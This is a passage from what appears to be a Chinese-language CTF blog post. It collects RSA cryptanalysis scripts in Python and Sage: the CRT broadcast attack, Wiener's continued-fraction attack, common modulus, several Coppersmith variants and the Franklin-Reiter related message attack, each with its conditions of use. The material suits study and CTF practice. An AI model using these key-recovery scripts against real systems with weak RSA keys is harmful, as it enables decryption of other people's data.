class="number">0x673c72ace143441c07cba491074163c003f1a550eab56b1255e5ea9fa2bbd68fd6a9ccb48db9fd66d5dfc6a55c79cad3d9de53f700a1e3c2a29731dc56ba43cd</span>,</span><br><span class="line"><span class="number">0x6111357d180d966a495f38566ebe4ea51fa0d54159b22bbd443cde9387687d87c08638483b39221883453a5ad09f6a0e3726b214e8e333037d178a3d0f125343</span>,</span><br><span class="line"><span class="number">0x26cd2225c0229b6a3f1d1d685e53d114aa3d792737d040fbc14189336ac12fb780872792b0c0b259847badffd1427897ede0d60247aa5e79633f27ccb43e7cc2</span></span><br><span class="line">]</span><br><span class="line">def <span class="type">CRT</span>(mi, ai):</span><br><span class="line">    <span class="built_in">assert</span>(<span class="built_in">reduce</span>(gmpy2.gcd,mi)==<span class="number">1</span>)</span><br><span class="line">    <span class="built_in">assert</span> (isinstance(mi, list) and isinstance(ai, list))</span><br><span class="line">    <span class="type">M</span> = <span class="built_in">reduce</span>(lambda x, y: x * y, mi)</span><br><span class="line">    ai_ti_Mi = [a * (<span class="type">M</span> / m) * gmpy2.invert(<span class="type">M</span> / m, m) <span class="keyword">for</span> (m, a) <span class="keyword">in</span> <span class="built_in">zip</span>(mi, ai)]</span><br><span class="line">    <span class="keyword">return</span> <span class="built_in">reduce</span>(lambda x, y: x + y, ai_ti_Mi) % <span class="type">M</span></span><br><span class="line">e=<span class="number">0x7</span></span><br><span class="line">m=gmpy2.iroot(<span class="type">CRT</span>(n, <span class="built_in">c</span>), e)[<span class="number">0</span>]</span><br><span class="line"><span class="built_in">print</span>(binascii.unhexlify(hex(m)[<span class="number">2</span>:].strip(<span class="string">"L"</span>)))</span><br></pre></td></tr></table></figure>

<h2 id="低解密指数攻击"><a href="#低解密指数攻击" class="headerlink" title="低解密指数攻击"></a>低解密指数攻击</h2><p>主要利用的是私钥d很小，表现形式一般是e很大</p>
<p>利用条件：给出n和e，e接近n</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">rational_to_contfrac</span> <span class="params">(x, y)</span>:</span></span><br><span class="line">    <span class="string">''' </span></span><br><span class="line"><span class="string">    Converts a rational x/y fraction into</span></span><br><span class="line"><span class="string">    a list of partial quotients [a0, ..., an] </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    a = x//y</span><br><span class="line">    <span class="keyword">if</span> a * y == x:</span><br><span class="line">        <span class="keyword">return</span> [a]</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        pquotients = rational_to_contfrac(y, x - a * y)</span><br><span class="line">        pquotients.insert(<span class="number">0</span>, a)</span><br><span class="line">        <span class="keyword">return</span> pquotients</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">convergents_from_contfrac</span><span class="params">(frac)</span>:</span>    </span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    computes the list of convergents</span></span><br><span class="line"><span class="string">    using the list of partial quotients </span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    convs = [];</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> range(len(frac)):</span><br><span class="line">        convs.append(contfrac_to_rational(frac[<span class="number">0</span>:i]))</span><br><span class="line">    <span class="keyword">return</span> convs</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">contfrac_to_rational</span> <span class="params">(frac)</span>:</span></span><br><span class="line">    <span class="string">'''Converts a finite continued fraction [a0, ..., an]</span></span><br><span class="line"><span class="string">     to an x/y rational.</span></span><br><span class="line"><span class="string">     '''</span></span><br><span class="line">    <span class="keyword">if</span> len(frac) == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> (<span class="number">0</span>,<span class="number">1</span>)</span><br><span class="line">    <span class="keyword">elif</span> len(frac) == <span class="number">1</span>:</span><br><span class="line">        <span class="keyword">return</span> (frac[<span class="number">0</span>], <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        remainder = frac[<span class="number">1</span>:len(frac)]</span><br><span class="line">        (num, denom) = contfrac_to_rational(remainder)</span><br><span class="line">        <span class="comment"># fraction is now frac[0] + 1/(num/denom), which is </span></span><br><span class="line">        <span class="comment"># frac[0] + denom/num.</span></span><br><span class="line">        <span class="keyword">return</span> (frac[<span class="number">0</span>] * num + denom, num)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Extended Euclidean Algorithm</span></span><br><span class="line"><span class="string">    returns x, y, gcd(a,b) such that ax + by = gcd(a,b)</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    u, u1 = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    v, v1 = <span class="number">0</span>, <span class="number">1</span></span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        q = a // b</span><br><span class="line">        u, u1 = u1, u - q * u1</span><br><span class="line">        v, v1 = v1, v - q * v1</span><br><span class="line">        a, b = b, a - q * b</span><br><span class="line">    <span class="keyword">return</span> u, v, a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">gcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    2.8 times faster than egcd(a,b)[2]</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    a,b=(b,a) <span class="keyword">if</span> a&lt;b <span class="keyword">else</span> (a,b)</span><br><span class="line">    <span class="keyword">while</span> b:</span><br><span class="line">        a,b=b,a%b</span><br><span class="line">    <span class="keyword">return</span> a</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">modInverse</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    d such that de = 1 (mod n)</span></span><br><span class="line"><span class="string">    e must be coprime to n</span></span><br><span class="line"><span class="string">    this is assumed to be true</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> egcd(e,n)[<span class="number">0</span>]%n</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">totient</span><span class="params">(p,q)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Calculates the totient of pq</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">return</span> (p<span class="number">-1</span>)*(q<span class="number">-1</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">bitlength</span><span class="params">(x)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Calculates the bitlength of x</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">assert</span> x &gt;= <span class="number">0</span></span><br><span class="line">    n = <span class="number">0</span></span><br><span class="line">    <span class="keyword">while</span> x &gt; <span class="number">0</span>:</span><br><span class="line">        n = n+<span class="number">1</span></span><br><span class="line">        x = x&gt;&gt;<span class="number">1</span></span><br><span class="line">    <span class="keyword">return</span> n</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">isqrt</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    Calculates the integer square root</span></span><br><span class="line"><span class="string">    for arbitrary large nonnegative integers</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    <span class="keyword">if</span> n &lt; <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">raise</span> ValueError(<span class="string">'square root not defined for negative numbers'</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> n == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">0</span></span><br><span class="line">    a, b = divmod(bitlength(n), <span class="number">2</span>)</span><br><span class="line">    x = <span class="number">2</span>**(a+b)</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        y = (x + n//x)//<span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> y &gt;= x:</span><br><span class="line">            <span class="keyword">return</span> x</span><br><span class="line">        x = y</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">is_perfect_square</span><span class="params">(n)</span>:</span></span><br><span class="line">    <span class="string">'''</span></span><br><span class="line"><span class="string">    If n is a perfect square it returns sqrt(n),</span></span><br><span class="line"><span class="string"></span></span><br><span class="line"><span class="string">    otherwise returns -1</span></span><br><span class="line"><span class="string">    '''</span></span><br><span class="line">    h = n &amp; <span class="number">0xF</span>; <span class="comment">#last hexadecimal "digit"</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> h &gt; <span class="number">9</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span> <span class="comment"># return immediately in 6 cases out of 16.</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Take advantage of Boolean short-circuit evaluation</span></span><br><span class="line">    <span class="keyword">if</span> ( h != <span class="number">2</span> <span class="keyword">and</span> h != <span class="number">3</span> <span class="keyword">and</span> h != <span class="number">5</span> <span class="keyword">and</span> h != <span class="number">6</span> <span class="keyword">and</span> h != <span class="number">7</span> <span class="keyword">and</span> h != <span class="number">8</span> ):</span><br><span class="line">        <span class="comment"># take square root if you must</span></span><br><span class="line">        t = isqrt(n)</span><br><span class="line">        <span class="keyword">if</span> t*t == n:</span><br><span class="line">            <span class="keyword">return</span> t</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">hack_RSA</span><span class="params">(e,n)</span>:</span></span><br><span class="line">    frac = rational_to_contfrac(e, n)</span><br><span class="line">    convergents = convergents_from_contfrac(frac)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (k,d) <span class="keyword">in</span> convergents:</span><br><span class="line">        <span class="comment">#check if d is actually the key</span></span><br><span class="line">        <span class="keyword">if</span> k!=<span class="number">0</span> <span class="keyword">and</span> (e*d<span class="number">-1</span>)%k == <span class="number">0</span>:</span><br><span class="line">            phi = (e*d<span class="number">-1</span>)//k</span><br><span class="line">            s = n - phi + <span class="number">1</span></span><br><span class="line">            <span class="comment"># check if the equation x^2 - s*x + n = 0</span></span><br><span class="line">            <span class="comment"># has integer roots</span></span><br><span class="line">            discr = s*s - <span class="number">4</span>*n</span><br><span class="line">            <span class="keyword">if</span>(discr&gt;=<span class="number">0</span>):</span><br><span class="line">                t = is_perfect_square(discr)</span><br><span class="line">                <span class="keyword">if</span> t!=<span class="number">-1</span> <span class="keyword">and</span> (s+t)%<span class="number">2</span>==<span class="number">0</span>:</span><br><span class="line">                    print(<span class="string">"\nHacked!"</span>)</span><br><span class="line">                    <span class="keyword">return</span> d</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">main</span><span class="params">()</span>:</span></span><br><span class="line">    n = <span class="number">9247606623523847772698953161616455664821867183571218056970099751301682205123115716089486799837447397925308887976775994817175994945760278197527909621793469</span></span><br><span class="line">    e = <span class="number">27587468384672288862881213094354358587433516035212531881921186101712498639965289973292625430363076074737388345935775494312333025500409503290686394032069</span></span><br><span class="line">    d=hack_RSA(e,n)</span><br><span class="line">    <span class="keyword">print</span> (<span class="string">"d="</span>)</span><br><span class="line">    <span class="keyword">print</span> (d)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">'__main__'</span>:</span><br><span class="line">	main()</span><br></pre></td></tr></table></figure>

<h2 id="共模攻击"><a href="#共模攻击" class="headerlink" title="共模攻击"></a>共模攻击</h2><p>利用条件：若干次加密，e不同，n相同，m相同。就可以在不分解n和求d的前提下，解出明文m。</p>
<p>首先，两个加密指数互质：<br>gcd(e1,e2)=1</p>
<p>即存在s1、s2使得：<br>s1*e1+s2*e2=1</p>
<p>又因为：<br>c1≡m^e1^ mod n<br>c2≡m^e2^mod n</p>
<p>代入化简可得：<br>c1^s1^ * c2^s2^ ≡ m mod n</p>
<p>即可求出明文</p>
<p>exp:</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">import</span> sys</span><br><span class="line"><span class="built_in">import</span> binascii</span><br><span class="line">sys.setrecursionlimit(<span class="number">1000000</span>)</span><br><span class="line">def egcd(a, b):</span><br><span class="line">    <span class="keyword">if</span> <span class="attr">a</span> == <span class="number">0</span>:</span><br><span class="line">      return (b, <span class="number">0</span>, <span class="number">1</span>)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      g, y, <span class="attr">x</span> = egcd(b % a, a)</span><br><span class="line">      return (g, x - (b // a) * y, y)</span><br><span class="line">def modinv(a, m):</span><br><span class="line">    g, x, <span class="attr">y</span> = egcd(a, m)</span><br><span class="line">    <span class="keyword">if</span> g != <span class="number">1</span>:</span><br><span class="line">      raise Exception('modular inverse does not exist')</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      return x % m</span><br><span class="line"></span><br><span class="line"><span class="attr">c1=</span></span><br><span class="line"><span class="attr">n=</span></span><br><span class="line"><span class="attr">e1=0xc21000af014a98b2455dec479</span></span><br><span class="line"><span class="attr">c2=</span></span><br><span class="line"><span class="attr">e2=0x9935842d63b75899ddd81b467</span></span><br><span class="line"></span><br><span class="line"><span class="attr">s</span> = egcd(e1, e2)</span><br><span class="line"><span class="attr">s1</span> = s[<span class="number">1</span>]</span><br><span class="line"><span class="attr">s2</span> = s[<span class="number">2</span>]</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> s1&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s1</span> = - s1</span><br><span class="line">   <span class="attr">c1</span> = modinv(c1, n)</span><br><span class="line">elif s2&lt;<span class="number">0</span>:</span><br><span class="line">   <span class="attr">s2</span> = - s2</span><br><span class="line">   <span class="attr">c2</span> = modinv(c2, n)</span><br><span class="line"><span class="attr">m=(pow(c1,s1,n)*pow(c2,s2,n))</span> % n</span><br><span class="line">print(m)</span><br></pre></td></tr></table></figure>

<h2 id="Stereotyped-messages"><a href="#Stereotyped-messages" class="headerlink" title="Stereotyped messages"></a>Stereotyped messages</h2><p>利用条件：已知模N，加密指数e和明文m高位，低位被隐藏，被隐藏部分位数小于N^1/e^</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">load(<span class="string">"coppersmith.sage"</span>)</span><br><span class="line">N = <span class="comment">#N的值</span></span><br><span class="line">e = 3 <span class="comment">#e的值，越小越好</span></span><br><span class="line">m = <span class="comment">#m的大概值</span></span><br><span class="line">c = <span class="comment">#c的值</span></span><br><span class="line">ZmodN = Zmod(N)</span><br><span class="line">P.&lt;x&gt; = PolynomialRing(ZmodN)</span><br><span class="line">f = (m + x)^e - c</span><br><span class="line">dd = f.degree()</span><br><span class="line">beta = 1</span><br><span class="line">epsilon = beta / 7</span><br><span class="line">mm = ceil(beta**2 / (dd * epsilon))</span><br><span class="line">tt = floor(dd * mm * ((1/beta) - 1))</span><br><span class="line">XX = ceil(N**((beta**2/dd) - epsilon))</span><br><span class="line">roots = coppersmith_howgrave_univariate(f, N, beta, mm, tt, XX)</span><br></pre></td></tr></table></figure>

<h2 id="Factoring-with-high-bits-known"><a href="#Factoring-with-high-bits-known" class="headerlink" title="Factoring with high bits known"></a>Factoring with high bits known</h2><p>利用条件：已知模N，加密指数e和p的高位，低位被隐藏</p>
<figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">n = 22696911229312659874738074899439457992248152730689278378819946543149357610634329627984531087669062301926875187991182013947223281619853855162918766480848703174390569130081348181282805736755296880728550799307081115704956570914024661831937343894022737660587549552490238277573409387371217121560461324557186812257740503722584510585462069159075200526635606677601131918281509060592393387176124235153517358363746584271646274866120051265119261146517578970232485246878726837916075299577720139317038118148106209530054587167536851896450431919312820852962596852961803405916618990419802746573064712215199008529683745905254572071511</span><br><span class="line"></span><br><span class="line">p = 147074002227133415720722266940278347837547446773140845973255972106195457070706386163214468466076525180963060306764217202402383643362009058035825033180123579226158735283108796018103129215920313383728956742526028603758044612649550810818410129300570667873028005104616597743709185068463293745855509286927802040320</span><br><span class="line">p_new = (p&gt;&gt;200)&lt;&lt;200</span><br><span class="line">pbits = 1024</span><br><span class="line">kbits = 200</span><br><span class="line">pbar = p_new &amp; (2^pbits-2^kbits)</span><br><span class="line">print <span class="string">"upper %d bits (of %d bits) is given"</span> % (pbits-kbits, pbits)</span><br><span class="line">PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">f = x + pbar</span><br><span class="line">x0 = f.small_roots(X=2^kbits, beta=0.4)[0] <span class="comment"># find root &lt; 2^kbits with factor &gt;= n^0.4</span></span><br><span class="line">print x0 + pbar</span><br></pre></td></tr></table></figure>

<h2 id="Partial-Key-Exposure-Attack-部分私钥暴露攻击"><a href="#Partial-Key-Exposure-Attack-部分私钥暴露攻击" class="headerlink" title="Partial Key Exposure Attack(部分私钥暴露攻击)"></a>Partial Key Exposure Attack(部分私钥暴露攻击)</h2><p>利用条件：已知模N，加密指数e和d的低位，高位被隐藏</p>
<figure class="highlight nix"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line">def partial_p(p0, kbits, n):</span><br><span class="line">    PR.&lt;x&gt; = PolynomialRing(Zmod(n))</span><br><span class="line">    <span class="attr">nbits</span> = n.nbits()</span><br><span class="line"></span><br><span class="line">    <span class="attr">f</span> = <span class="number">2</span>^kbits*x + p0</span><br><span class="line">    <span class="attr">f</span> = f.monic()</span><br><span class="line">    <span class="attr">roots</span> = f.small_roots(<span class="attr">X=2^(nbits//2-kbits),</span> <span class="attr">beta=0.3)</span>  <span class="comment"># find root &lt; 2^(nbits//2-kbits) with factor &gt;= n^0.3</span></span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        <span class="attr">x0</span> = roots[<span class="number">0</span>]</span><br><span class="line">        <span class="attr">p</span> = gcd(<span class="number">2</span>^kbits*x0 + p0, n)</span><br><span class="line">        return ZZ(p)</span><br><span class="line"></span><br><span class="line">def find_p(d0, kbits, e, n):</span><br><span class="line">    <span class="attr">X</span> = var('X')</span><br><span class="line"></span><br><span class="line">    for k <span class="keyword">in</span> xrange(<span class="number">1</span>, e+<span class="number">1</span>):</span><br><span class="line">        <span class="attr">results</span> = solve_mod([e*d0*X - k*X*(n-X+<span class="number">1</span>) + k*<span class="attr">n</span> == X], <span class="number">2</span>^kbits)</span><br><span class="line">        for x <span class="keyword">in</span> results:</span><br><span class="line">            <span class="attr">p0</span> = ZZ(x[<span class="number">0</span>])</span><br><span class="line">            <span class="attr">p</span> = partial_p(p0, kbits, n)</span><br><span class="line">            <span class="keyword">if</span> p:</span><br><span class="line">                return p</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="attr">__name__</span> == '__main__':</span><br><span class="line">    <span class="attr">n</span> = <span class="comment">#N的值</span></span><br><span class="line">    <span class="attr">e</span> = <span class="number">3</span></span><br><span class="line">    <span class="attr">d</span> = <span class="comment">#d的近似值</span></span><br><span class="line">    <span class="attr">beta</span> = <span class="number">0.5</span></span><br><span class="line">    <span class="attr">epsilon</span> = beta^<span class="number">2</span>/<span class="number">7</span></span><br><span class="line"></span><br><span class="line">    <span class="attr">nbits</span> = n.nbits()</span><br><span class="line">    <span class="attr">kbits</span> = <span class="number">511</span></span><br><span class="line">    <span class="attr">d0</span> = d &amp; (<span class="number">2</span>^kbits-<span class="number">1</span>)</span><br><span class="line">    print <span class="string">"lower %d bits (of %d bits) is given"</span> % (kbits, nbits)</span><br><span class="line"></span><br><span class="line">    <span class="attr">p</span> = find_p(d0, kbits, e, n)</span><br><span class="line">    print <span class="string">"found p: %d"</span> % p</span><br><span class="line">    <span class="attr">q</span> = n//p</span><br><span class="line">    print d</span><br><span class="line">    print inverse_mod(e, (p-<span class="number">1</span>)*(q-<span class="number">1</span>))</span><br></pre></td></tr></table></figure>

<h2 id="Related-Message-Attack"><a href="#Related-Message-Attack" class="headerlink" title="Related Message Attack"></a>Related Message Attack</h2><p>利用条件：已知n,e=3,c以及m+padding的密文x，求m        (小指数)</p>
<figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">import gmpy</span><br><span class="line">def getM2(<span class="keyword">a</span>,b,c1,c2,n):</span><br><span class="line">    a3 = pow(<span class="keyword">a</span>,<span class="number">3</span>,n)</span><br><span class="line">    b3 = pow(b,<span class="number">3</span>,n)</span><br><span class="line">    <span class="keyword">first</span> = c1-a3*c2+<span class="number">2</span>*b3</span><br><span class="line">    <span class="keyword">first</span> = <span class="keyword">first</span> % n</span><br><span class="line">    <span class="keyword">second</span> = <span class="number">3</span>*b*(a3*c2-b3)</span><br><span class="line">    <span class="keyword">second</span> = <span class="keyword">second</span> % n</span><br><span class="line">    <span class="keyword">third</span> = <span class="keyword">second</span>*gmpy.invert(<span class="keyword">first</span>,n)</span><br><span class="line">    <span class="keyword">third</span> = <span class="keyword">third</span> % n</span><br><span class="line">    <span class="keyword">fourth</span> = (<span class="keyword">third</span>+b)*gmpy.invert(<span class="keyword">a</span>,n)</span><br><span class="line">    <span class="literal">return</span> <span class="keyword">fourth</span> % n</span><br><span class="line"></span><br><span class="line"><span class="keyword">a</span> = <span class="number">1</span></span><br><span class="line">b = <span class="number">-1</span>		<span class="comment">#b=padding1-padding2（padding是加密的明文与明文的差）</span></span><br><span class="line">c1 = <span class="number">0x7175f2614b8d1a27b43f7c3873b3422658af28291ddc88b15f97f499e00cd4c5c4fd980f062376a61e5dd4c15d52d73262d3c066f1e8f46a04af6fead7c3960d2768a0d214bbc3e05d2f6e56aee158071574e55753624a19e094590fc3f9918a2065cd5ff7693e0d34517bc0072e6c9e444e66c4ece88d657f99e44bee48924</span>L</span><br><span class="line">c2 =<span class="number">0xd5f4af36b5391bd731cfa4313466024ab1bc3b455024a5d8b218faba0e956252f01c4d01bd36765035c33d73e5af7f178aeb2606edf86814d74082c64828fa4c1666b69d05fab69dd1ef47b243356290fdb74e001f54edec70681cf52319c73bce9acda4803a9e97597ca21d60072c2d2b516f161bec1f6a91baa2e24c7655b</span>L</span><br><span class="line">padding2 = <span class="number">1</span></span><br><span class="line">n = <span class="number">0xf2e5339236455e2bc1b1bd12e45b9341a3b223ddb02dec11c880fa4aa8835df9e463e4c446292cd5a2fe19b10017856654b6d6c3f3a94a95807712329f7dae2e1e6506094d5d2f9c8a05c35cbf3366330996db9bff930fe566016d5e850e232057d419292ce30df9c135d56ef1bb72c38838d4b127aa577ceb4aba94d4e0d55</span>L</span><br><span class="line">m = getM2(<span class="keyword">a</span>,b,c1,c2,n)-padding2</span><br><span class="line">print hex(m)</span><br></pre></td></tr></table></figure>

